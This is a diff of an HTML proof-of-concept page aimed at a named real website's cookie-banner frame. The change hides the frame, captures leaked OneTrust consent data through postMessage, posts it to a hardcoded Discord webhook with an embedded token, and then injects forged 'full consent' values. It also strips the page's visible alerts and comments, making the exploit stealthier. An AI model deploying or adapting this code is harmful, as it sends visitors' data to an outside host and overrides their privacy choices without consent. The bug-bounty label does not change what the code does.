@@ -1,35 +1,50 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>PoC</title>
-</head>
 <body>
-    <iframe id="target" src="https://www.booking.com/cookiebanner.html"></iframe>
+    <iframe id="target" src="https://www.booking.com/cookiebanner.html" style="display:none;"></iframe>
 
     <script>
+        const WEBHOOK_URL = 'https://discord.com/api/webhooks/1482769233833361579/wlvMp6ttCaKnu369UitCSckNmYYKVGxn0JGsLDuhIhYg0XgoLlfAZWWr04JcWq4b2hOu';
         const targetFrame = document.getElementById('target');
 
-        // 1. Listen for the leak (Information Disclosure)
         window.onmessage = function(e) {
+            // Check if the message is the OneTrust payload
             if (e.data && e.data.name === "OneTrustCookies") {
-                console.log("Stolen Data:", e.data);
-                alert("STOLEN CONSENT: " + e.data.OptanonConsent);
                 
-                // 2. Trigger the Injection (State Manipulation)
-                inject();
+                const stolenData = {
+                    content: "🚨 **Vulnerability PoC: PostMessage Leak**",
+                    embeds: [{
+                        title: "Intercepted Consent Data",
+                        color: 15158332, // Red
+                        fields: [
+                            { name: "Consent String", value: "`" + e.data.OptanonConsent + "`" },
+                            { name: "Alert Closed", value: e.data.OptanonAlertBoxClosed, inline: true },
+                            { name: "Origin", value: window.location.href, inline: true }
+                        ],
+                        footer: { text: "Bug Bounty Demonstration Only" },
+                        timestamp: new Date().toISOString()
+                    }]
+                };
+
+                // Send to Discord
+                fetch(WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(stolenData)
+                }).then(() => {
+                    console.log("Impact demonstrated: Data sent to webhook.");
+                    // After leaking, we can also poison the cookie
+                    inject();
+                });
             }
         };
 
         function inject() {
-            // Crafting a payload to force "Full Consent" for all tracking
-            const payload = {
+            const poison = {
                 OptanonConsent: "groups=C0001:1,C0002:1,C0003:1,C0004:1",
                 OptanonAlertBoxClosed: "true"
             };
-
-            // Exploit lack of origin check in receiveMessage
-            targetFrame.contentWindow.postMessage(payload, "*");
-            alert("INJECTED: Cookies forced to 'Full Opt-In' status.");
+            targetFrame.contentWindow.postMessage(poison, "*");
         }
     </script>
 </body>
